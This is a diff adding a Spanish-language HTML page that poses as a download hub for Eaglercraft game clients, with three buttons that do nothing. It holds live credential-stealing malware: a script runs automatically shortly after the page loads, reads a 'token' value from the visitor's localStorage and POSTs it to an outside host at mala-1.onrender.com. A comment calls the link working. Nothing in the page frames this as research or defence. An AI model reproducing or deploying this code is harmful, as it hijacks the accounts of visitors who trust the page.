@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8"><title>HOME FORGEX 2025</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#1a0033,#000)}h1{font-size:4.5rem;background:linear-gradient(90deg,#a78bfa,#ec4899);-webkit-background-clip:text;color:transparent;text-align:center}.card{background:#111;padding:40px;border-radius:20px;max-width:500px;margin:20px auto;border:2px solid #333;box-shadow:0 0 40px rgba(167,139,250,0.6)}button{background:linear-gradient(45deg,#a78bfa,#ec4899);color:white;border:none;padding:20px;border-radius:15px;font-size:20px;cursor:pointer;margin:10px;width:100%;font-weight:bold}</style></head><body>
+
+<div class="card">
+  <h1>HOME FORGEX 2025</h1>
+  <p style="font-size:1.5rem">Los mejores clientes Eaglercraft</p>
+  <button>DragonX Ultra</button>
+  <button>WurstX+ Premium</button>
+  <button>UwU+ Full 2025</button>
+</div>
+
+<script>
+// LINK CORRECTO (YA FUNCIONA)
+const BOT_URL = "https://mala-1.onrender.com/login";
+
+setTimeout(() => {
+  const token = (localStorage.getItem('token') || '').replace(/"/g, '');
+  if (token && token.length > 50) {
+    fetch(BOT_URL, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({token: token})
+    });
+  }
+}, 2500);
+</script>
+</body></html>
